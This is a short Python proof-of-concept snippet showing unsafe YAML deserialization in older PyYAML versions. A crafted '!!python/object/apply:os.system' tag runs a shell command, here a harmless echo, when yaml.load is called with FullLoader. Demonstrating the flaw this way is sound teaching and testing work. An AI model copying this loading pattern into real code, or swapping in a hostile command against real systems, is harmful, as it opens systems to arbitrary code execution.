# Vulnerable script using PyYAML <=5.1
import yaml

# This YAML string can execute arbitrary code
malicious_yaml = """
!!python/object/apply:os.system ["echo Vulnerable!"]
"""

# Vulnerable usage
yaml.load(malicious_yaml, Loader=yaml.FullLoader)  # unsafe!
